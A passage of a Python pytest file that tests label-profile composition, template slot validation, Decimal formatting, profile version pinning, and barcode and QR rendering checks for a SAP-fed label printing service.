                slot_id="batch_barcode",
                output_type="barcode",
                symbology="code128",
                segments=[FieldSegment(source="business_context", field_name="batch_number")],
            ),
        ],
    )
    ProfileRegistry.register(custom_profile)

    item_dict = build_valid_n001_raw_item(seq=1, batch_num="B260901")
    item_dict["profile_version"] = "0.3.0-dev"
    raw_item = RawSapItemSnapshotV2(**item_dict)

    canonical_item, tmpl_id, audit_meta = N001DevelopmentAdapter.adapt_item(
        raw_item, profile_version="0.3.0-dev", compose_profile=True
    )
    # The composed text element MUST override the default raw fact in canonical fields
    assert canonical_item.fields.batch_text == "COMPOSED-TEXT-CUSTOM"
    assert canonical_item.fields.batch_number == "B260901"


def test_p1_3_strict_slot_validation_rejects_mismatched_element_types():
    """P1-3: validate_template_compatibility strictly checks attribute types and rejects mismatched slots."""
    # 1. Barcode output_type pointing to QR slot (qr_payload) fails closed
    p_barcode_in_qr = LabelProfileConfig(
        label_code="N001",
        profile_version="9.1.0-test",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="qr_payload",
                output_type="barcode",
                symbology="code128",
                segments=[LiteralSegment(value="12345")],
            ),
        ],
    )
    with pytest.raises(TemplateSlotMissingError) as exc:
        ProfileComposer.validate_template_compatibility(p_barcode_in_qr)
    assert "missing 1d barcode slot 'qr_payload'" in str(exc.value).lower()

    # 2. QR output_type pointing to Barcode slot (batch_barcode) fails closed
    p_qr_in_barcode = LabelProfileConfig(
        label_code="N001",
        profile_version="9.2.0-test",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="batch_barcode",
                output_type="qr",
                symbology="qr",
                segments=[LiteralSegment(value="QR_DATA")],
            ),
        ],
    )
    with pytest.raises(TemplateSlotMissingError) as exc:
        ProfileComposer.validate_template_compatibility(p_qr_in_barcode)
    assert "missing 2d qr slot 'batch_barcode'" in str(exc.value).lower()

    # 3. Text output_type pointing to code slot fails closed
    p_text_in_code = LabelProfileConfig(
        label_code="N001",
        profile_version="9.3.0-test",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="batch_barcode",
                output_type="text",
                segments=[LiteralSegment(value="TEXT")],
            ),
        ],
    )
    with pytest.raises(TemplateSlotMissingError) as exc:
        ProfileComposer.validate_template_compatibility(p_text_in_code)
    assert "is a code slot in template" in str(exc.value).lower()

    # 4. Barcode slot not supported by renderer contract fails closed
    p_unsupported_barcode = LabelProfileConfig(
        label_code="N001",
        profile_version="9.4.0-test",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="unsupported_barcode_slot",
                output_type="barcode",
                symbology="code128",
                segments=[LiteralSegment(value="123")],
            ),
        ],
    )
    with pytest.raises(TemplateSlotMissingError):
        ProfileComposer.validate_template_compatibility(p_unsupported_barcode)


def test_p1_4_round_decimal_strict_parsing():
    """P1-4: apply_field_formatting strictly parses numerics with Decimal, failing closed on invalid data."""
    fmt = FieldFormatConfig(operation="round_decimal", decimals=2)

    # 1. Mixed letters and numbers ("12kg34") MUST NOT be silently stripped into 1234.00
    with pytest.raises(ProfileCompositionError) as exc:
        apply_field_formatting("12kg34", fmt)
    assert "invalid numeric value" in str(exc.value).lower()
    assert "12kg34" not in str(exc.value), "Raw input must not be leaked in exception message"

    # 2. Arbitrary text ("not-a-number") fails closed without leaking raw text
    with pytest.raises(ProfileCompositionError) as exc:
        apply_field_formatting("not-a-number", fmt)
    assert "invalid numeric value" in str(exc.value).lower()
    assert "not-a-number" not in str(exc.value), "Raw input must not be leaked in exception message"

    # 3. Non-finite values (NaN, Infinity) fail closed without leaking raw text
    with pytest.raises(ProfileCompositionError) as exc:
        apply_field_formatting("NaN", fmt)
    assert "non-finite decimal value" in str(exc.value).lower()
    assert "NaN" not in str(exc.value)

    with pytest.raises(ProfileCompositionError) as exc:
        apply_field_formatting("Infinity", fmt)
    assert "non-finite decimal value" in str(exc.value).lower()
    assert "Infinity" not in str(exc.value)

    # 4. Valid numeric formatting succeeds deterministically with ROUND_HALF_UP
    assert apply_field_formatting("123.456", fmt) == "123.46"
    assert apply_field_formatting("100", fmt) == "100.00"
    assert apply_field_formatting("-42.5", fmt) == "-42.50"

    fmt_suffix = FieldFormatConfig(operation="round_decimal", decimals=1, unit_suffix=" Meter")
    assert apply_field_formatting("1500.25", fmt_suffix) == "1500.3 Meter"


def test_p1_raw_sap_value_never_leaked_in_http_error(isolated_service: SapShadowService):
    """P1: Verifies HTTP 400 responses never leak raw SAP field values or synthetic sentinel text."""
    sentinel = "SYNTHETIC_PRIVATE_TEXT_CONFIDENTIAL_12345"

    # Profile configuring round_decimal on customer_text
    prof = LabelProfileConfig(
        label_code="N001",
        profile_version="0.5.0-dev",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="batch_text",
                output_type="text",
                segments=[
                    FieldSegment(
                        source="business_context",
                        field_name="customer_text",
                        format=FieldFormatConfig(operation="round_decimal", decimals=2),
                    )
                ],
            ),
            ProfileElementConfig(
                slot_id="batch_barcode",
                output_type="barcode",
                symbology="code128",
                segments=[FieldSegment(source="business_context", field_name="batch_number")],
            ),
        ],
    )
    ProfileRegistry.register(prof)
    ProfileRegistry.set_active_version("N001", "0.5.0-dev")

    item = build_valid_n001_raw_item(seq=1)
    item["profile_version"] = "0.5.0-dev"
    item["business_context"]["customer_text"] = sentinel
    batch_req = build_valid_raw_batch([item], request_id=f"REQ-SENTINEL-{uuid.uuid4()}")
    batch_req["profile_version"] = "0.5.0-dev"

    with patch("backend.app.api.routes_sap_shadow.is_sap_shadow_simulation_enabled", return_value=True), \
         patch("backend.app.api.routes_sap_shadow.get_sap_simulation_auth_token", return_value=TEST_AUTH_TOKEN), \
         patch("backend.app.api.routes_sap_shadow.sap_shadow_service", isolated_service):
        client = TestClient(app)
        res = client.post(
            "/api/v1/simulation/raw-batches",
            json=batch_req,
            headers={"X-SAP-Simulation-Token": TEST_AUTH_TOKEN},
        )
        assert res.status_code == 400
        assert sentinel not in res.text, f"Confidential sentinel was leaked in HTTP response: {res.text}"
        assert "invalid numeric value" in res.text.lower()


def test_p2_1_batch_item_version_mismatch_fails_closed(isolated_service: SapShadowService):
    """P2-1: Batch-level profile_version conflicting with item-level profile_version fails closed."""
    item1 = build_valid_n001_raw_item(seq=1)
    item1["profile_version"] = "0.2.0-dev"
    batch_dict = build_valid_raw_batch([item1], request_id="REQ-MISMATCH-P2-1")
    batch_dict["profile_version"] = "0.1.0-dev"
    batch_req = RawSapBatchSnapshotV2(**batch_dict)

    with pytest.raises(ValueError) as exc:
        asyncio.run(isolated_service.ingest_raw_batch(batch_req))
    assert "mismatches item sequence 1 profile_version" in str(exc.value).lower()


def test_p2_1_application_version_pinning():
    """P2-1: Application owns and controls the active approved profile version policy."""
    # Active version defaults to initial registered version
    assert ProfileRegistry.get_active_version("N001") == "0.1.0-dev"

    # Register an alternative version
    v2_profile = LabelProfileConfig(
        label_code="N001",
        profile_version="0.2.0-dev",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="batch_barcode",
                output_type="barcode",
                symbology="code128",
                segments=[LiteralSegment(value="V2-ACTIVE")],
            )
        ],
    )
    ProfileRegistry.register(v2_profile)

    # Pin active version to 0.2.0-dev
    ProfileRegistry.set_active_version("N001", "0.2.0-dev")
    assert ProfileRegistry.get_active_version("N001") == "0.2.0-dev"

    # get() without explicit version returns pinned active version
    resolved = ProfileRegistry.get("N001")
    assert resolved is not None
    assert resolved.profile_version == "0.2.0-dev"

    # Setting active version for unregistered version raises ProfileNotFoundError
    with pytest.raises(ProfileNotFoundError) as exc:
        ProfileRegistry.set_active_version("N001", "9.9.9-unregistered")
    assert "is not registered" in str(exc.value).lower()


def test_p2_reject_sap_requesting_inactive_profile_version(isolated_service: SapShadowService):
    """P2: Server-side policy strictly rejects SAP payloads requesting inactive profile versions."""
    # Ensure active version is 0.1.0-dev
    ProfileRegistry.set_active_version("N001", "0.1.0-dev")

    # Register version 0.2.0-dev
    v2_profile = LabelProfileConfig(
        label_code="N001",
        profile_version="0.2.0-dev",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="batch_barcode",
                output_type="barcode",
                symbology="code128",
                segments=[LiteralSegment(value="V2-DATA")],
            )
        ],
    )
    ProfileRegistry.register(v2_profile)

    # 1. SAP requests version 0.2.0-dev while active version is 0.1.0-dev -> FAIL CLOSED (ValueError)
    item = build_valid_n001_raw_item(seq=1)
    item["profile_version"] = "0.2.0-dev"
    batch_req = RawSapBatchSnapshotV2(**build_valid_raw_batch([item], request_id="REQ-INACTIVE-P2"))

    with pytest.raises(ValueError) as exc:
        asyncio.run(isolated_service.ingest_raw_batch(batch_req))
    assert "is not authorized" in str(exc.value).lower()
    assert "application policy strictly enforces active profile version '0.1.0-dev'" in str(exc.value).lower()

    # 2. Pin application active version to 0.2.0-dev -> Now 0.2.0-dev is accepted!
    ProfileRegistry.set_active_version("N001", "0.2.0-dev")
    res = asyncio.run(isolated_service.ingest_raw_batch(batch_req, auto_process=False))
    assert res["status"] == "accepted"
    assert res["profile_version"] == "0.2.0-dev"


def test_p2_2_deep_evidence_composed_text_and_code_inspection(isolated_service: SapShadowService):
    """P2-2: Deep inspection of rendered intermediate SVG and PDF evidence verifies composed elements and codes."""
    import re
    import xml.etree.ElementTree as ET

    custom_profile = LabelProfileConfig(
        label_code="N001",
        profile_version="0.4.0-dev",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="batch_text",
                output_type="text",
                segments=[LiteralSegment(value="VERIFIED-TEXT-INSPECTION")],
            ),
            ProfileElementConfig(
                slot_id="batch_barcode",
                output_type="barcode",
                symbology="code128",
                segments=[FieldSegment(source="business_context", field_name="batch_number")],
            ),
            ProfileElementConfig(
                slot_id="qr_payload",
                output_type="qr",
                symbology="qr",
                segments=[
                    LiteralSegment(value="QR-INSPECT-BATCH:"),
                    FieldSegment(source="business_context", field_name="batch_number"),
                ],
            ),
        ],
    )
    ProfileRegistry.register(custom_profile)
    ProfileRegistry.set_active_version("N001", "0.4.0-dev")

    item = build_valid_n001_raw_item(seq=1, batch_num="BATCH-INSPECT-99")
    item["profile_version"] = "0.4.0-dev"
    batch_req = RawSapBatchSnapshotV2(**build_valid_raw_batch([item], request_id="REQ-INSPECT-P2-2"))

    # Ingest and process
    res = asyncio.run(isolated_service.ingest_raw_batch(batch_req, auto_process=False))
    batch_id = res["batch_id"]
    asyncio.run(isolated_service.process_batch(batch_id))

    # 1. Inspect intermediate rendered SVG directly from the completed batch record
    record = isolated_service.get_batch(batch_id)
    assert record is not None
    rendered_item = record["items"][0]
    rendered_svg = rendered_item.get("rendered_svg")
    assert rendered_svg is not None, "Real rendering pipeline must store rendered_svg on completed item"

    # Explicit assertion 1: Composed text is present in the rendered SVG
    assert "VERIFIED-TEXT-INSPECTION" in rendered_svg, "Composed text must be injected into template SVG"

    # Explicit assertion 2: Code128 barcode vector path geometry and bit pattern inspection
    tmpl_path = TemplateService.get_template_path("label_roll_80x200")
    assert tmpl_path is not None, "Builtin template label_roll_80x200 must exist"
    tmpl_tree = ET.parse(tmpl_path)
    tmpl_root = tmpl_tree.getroot()

    bc_rect = [el for el in tmpl_root.iter() if el.attrib.get("id") == "rect_batch_barcode"][0]
    bc_x = float(bc_rect.attrib["x"])
    bc_y = float(bc_rect.attrib["y"])
    bc_w = float(bc_rect.attrib["width"])
    bc_h = float(bc_rect.attrib["height"])

    svg_root = ET.fromstring(rendered_svg)
    barcode_groups = [e for e in svg_root.iter() if e.attrib.get("id") in ("rect_batch_barcode", "batch_barcode")]
    assert len(barcode_groups) > 0, "Barcode group must be present in rendered SVG"
    barcode_path = list(barcode_groups[0])[0]
    assert barcode_path.attrib.get("shape-rendering") == "crispEdges"

    actual_barcode_d = barcode_path.attrib.get("d", "")

    # Compare complete geometry against reference generator for expected vs wrong payload
    expected_barcode_group = create_barcode_svg_group("BATCH-INSPECT-99", bc_x, bc_y, bc_w, bc_h)
    wrong_barcode_group = create_barcode_svg_group("WRONG-INSPECT-99", bc_x, bc_y, bc_w, bc_h)
    expected_barcode_d = expected_barcode_group[0].attrib["d"]
    wrong_barcode_d = wrong_barcode_group[0].attrib["d"]

    assert actual_barcode_d == expected_barcode_d, "Rendered barcode path must match exact vector geometry for 'BATCH-INSPECT-99'"
    assert actual_barcode_d != wrong_barcode_d, "Rendered barcode path must differ from wrong payload with identical bar count"

    # Reconstruct 1D bit pattern from actual SVG subpaths and assert exact 211-bit match
    code128_pattern = generate_code128_pattern("BATCH-INSPECT-99")
    wrong_code128_pattern = generate_code128_pattern("WRONG-INSPECT-99")
    total_modules = len(code128_pattern)
    module_w = bc_w / float(total_modules)
    bc_subpaths = re.findall(r"M([\d\.]+),([\d\.]+)H([\d\.]+)V([\d\.]+)H([\d\.]+)Z", actual_barcode_d)
    assert len(bc_subpaths) == len(re.findall(r"1+", code128_pattern)), "Bar subpath count must match pattern runs"

    reconstructed_bits = ["0"] * total_modules
    for m in bc_subpaths:
        x0, y0, x1, y1, _ = [float(v) for v in m]
        start_idx = int(round((x0 - bc_x) / module_w))
        run_len = int(round((x1 - x0) / module_w))
        for i in range(start_idx, start_idx + run_len):
            reconstructed_bits[i] = "1"
    reconstructed_pattern = "".join(reconstructed_bits)
    assert reconstructed_pattern == code128_pattern, "Reconstructed bit pattern must match Code128 expected pattern"
    assert reconstructed_pattern != wrong_code128_pattern, "Reconstructed bit pattern must not match WRONG-INSPECT-99"

    # Explicit assertion 3: QR matrix vector path geometry and 2D matrix inspection
    qr_rect = [el for el in tmpl_root.iter() if el.attrib.get("id") == "rect_batch_barcode-8"][0]
    qr_x = float(qr_rect.attrib["x"])
    qr_y = float(qr_rect.attrib["y"])
    qr_w = float(qr_rect.attrib["width"])
    qr_h = float(qr_rect.attrib["height"])

    qr_groups = [e for e in svg_root.iter() if e.attrib.get("id") in ("rect_batch_barcode-8", "qr_payload")]
    assert len(qr_groups) > 0, "QR group must be present in rendered SVG"
    qr_path = list(qr_groups[0])[0]
    assert qr_path.attrib.get("shape-rendering") == "crispEdges"

    expected_qr_payload = "QR-INSPECT-BATCH:BATCH-INSPECT-99"
    wrong_qr_payload = "QR-INSPECT-BATCH:WRONG-INSPECT-99"
    actual_qr_d = qr_path.attrib.get("d", "")

    # Compare complete geometry against reference generator for expected vs wrong QR payload
    expected_qr_group = create_qr_svg_group(expected_qr_payload, qr_x, qr_y, qr_w, qr_h)
    wrong_qr_group = create_qr_svg_group(wrong_qr_payload, qr_x, qr_y, qr_w, qr_h)
    expected_qr_d = expected_qr_group[0].attrib["d"]
    wrong_qr_d = wrong_qr_group[0].attrib["d"]

    assert actual_qr_d == expected_qr_d, "Rendered QR path must match exact vector geometry for expected QR payload"
    assert actual_qr_d != wrong_qr_d, "Rendered QR path must differ from wrong QR payload"

    # Reconstruct 2D boolean module matrix from actual SVG subpaths and assert exact matrix match
    qr_matrix = generate_qr_matrix(expected_qr_payload)
    wrong_qr_matrix = generate_qr_matrix(wrong_qr_payload)
    rows = len(qr_matrix)
    cols = len(qr_matrix[0])
    box_size = min(qr_w / cols, qr_h / rows)
    offset_x = qr_x + (qr_w - (cols * box_size)) / 2.0
    offset_y = qr_y + (qr_h - (rows * box_size)) / 2.0

    reconstructed_matrix = [[False] * cols for _ in range(rows)]
    qr_subpaths = re.findall(r"M([\d\.]+),([\d\.]+)H([\d\.]+)V([\d\.]+)H([\d\.]+)Z", actual_qr_d)
    for m in qr_subpaths:
        x0, y0, x1, y1, _ = [float(v) for v in m]
        r = int(round((y0 - offset_y) / box_size))
        c_start = int(round((x0 - offset_x) / box_size))
        span = int(round((x1 - x0) / box_size))
        for c in range(c_start, c_start + span):
            reconstructed_matrix[r][c] = True

    assert reconstructed_matrix == qr_matrix, "Reconstructed 2D QR matrix must match expected QR matrix"
    assert reconstructed_matrix != wrong_qr_matrix, "Reconstructed 2D QR matrix must not match wrong QR matrix"

    # 2. Retrieve PDF evidence and verify pages and physical dimensions
    pdf_bytes = isolated_service.get_evidence_pdf(batch_id)
    assert pdf_bytes.startswith(b"%PDF-")

    reader = PdfReader(io.BytesIO(pdf_bytes))
    # 2 pages: Cover manifest + Label page
    assert len(reader.pages) == 2

    # Extract image from label page
    label_page = reader.pages[1]
    assert len(label_page.images) == 1
    pdf_image = label_page.images[0]

    pil_img = Image.open(io.BytesIO(pdf_image.data))
    # Dimensions match 200mm x 80mm at 203.2 DPI = 1600 x 640 px
    assert pil_img.size == (1600, 640)

    # Verify image has both black bars and white background
    extrema = pil_img.convert("L").getextrema()
    assert extrema[0] < 50, f"Expected dark barcode pixels, got min {extrema[0]}"
    assert extrema[1] > 200, f"Expected light background pixels, got max {extrema[1]}"
